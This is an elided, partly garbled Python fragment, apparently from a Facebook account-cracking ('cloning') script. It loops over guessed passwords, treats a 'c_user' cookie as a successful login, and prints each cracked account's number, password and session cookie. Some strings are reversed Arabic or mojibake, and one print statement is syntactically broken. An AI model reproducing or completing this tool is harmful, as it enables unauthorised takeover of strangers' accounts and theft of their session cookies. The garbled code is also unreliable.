...
def xyz():
    ...
    print(f"[E]     \033[1;31mEXIT PROGRAM طوبرم طشن ديصت تادا)

    print(f"يروتس ةروبلا تادال روطم")
...
def Random():
    ...
    limit = int(input(' EXAMPLE: 1000,2000, 3000, 5000, 50000,  10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[QusaiI-OKكضح😂]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                ...
                print(f'\r\033[1;31m [Qusai-CP😓🫶بيصن] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
